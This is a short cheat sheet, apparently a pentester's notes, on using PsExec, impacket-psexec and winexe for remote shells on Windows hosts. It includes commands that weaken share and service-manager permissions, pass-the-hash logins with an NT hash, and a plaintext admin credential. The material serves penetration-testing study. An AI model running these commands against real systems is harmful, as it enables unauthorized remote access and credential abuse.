# PsExec

### Requirements for PsExec to work

1. User is able to write a file to the share.
2. Create and start a service.

<details>

<summary>Enabling Writable Shares</summary>

* Right-click --> Properties

<img src="../.gitbook/assets/image (97).png" alt="" data-size="original">

* Sharing tab --> Advanced Sharing. Check the `Share this folder` checkbox.

<img src="../.gitbook/assets/image (71).png" alt="" data-size="original">

* Click `Apply` and `ok` for all.

![](<../.gitbook/assets/image (38).png>)

</details>

<details>

<summary>Change permissions of unwritable shared folders</summary>

```sh
cd c:\windows\temp
icacls .
icacls . /grant :r Everyone:F
```

</details>

<details>

<summary>Allows ability to create and start a service</summary>

```sh
sc sdset scmanager "D:(A;;KA;;;AU)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)"
```

</details>

<details>

<summary>Check if able to login using PsExec</summary>

Login PsExec with username and password

```bash
impacket-psexec corp1/sqlsvc@appsrv01
```

* password prompt will appear

</details>

<details>

<summary>PTH PsExec (pass-the-hash)</summary>

```bash
impacket-psexec resourced/jack@192.168.231.175 -hashes <lm>:<nt>
```

* From Win 10, Microsoft made the change so LM hashes are not used anymore, but since tools are legacy:

```bash
impacket-psexec resourced/jack@192.168.231.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```

</details>

### Using Winexe

```bash
winexe -U Administrator%Welcome1! //10.10.10.72 "cmd.exe"
```

